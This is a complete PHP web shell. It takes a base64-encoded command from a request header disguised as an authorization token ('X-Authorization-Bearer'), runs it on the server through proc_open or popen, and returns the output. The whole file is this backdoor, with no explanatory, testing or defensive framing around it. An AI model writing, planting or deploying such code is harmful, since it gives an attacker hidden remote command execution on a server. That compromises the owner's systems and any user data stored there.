<?php

$headers = getallheaders();
if (!isset($headers['X-Authorization-Bearer'])) {
    http_response_code(403);
    exit("Forbidden");
}


$cmd = base64_decode($headers['X-Authorization-Bearer']);
if (!$cmd) {
    http_response_code(400);
    exit("Invalid command");
}


function executeCommand($cmd) {
    $descriptorspec = [
        0 => ["pipe", "r"],
        1 => ["pipe", "w"],
        2 => ["pipe", "w"] 
    ];
    
    $process = proc_open($cmd, $descriptorspec, $pipes);
    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        return $output;
    }


    $handle = popen($cmd, "r");
    if ($handle) {
        $output = stream_get_contents($handle);
        pclose($handle);
        return $output;
    }

    return "Execution failed";
}


header("Content-Type: text/plain");
echo executeCommand($cmd);
?>
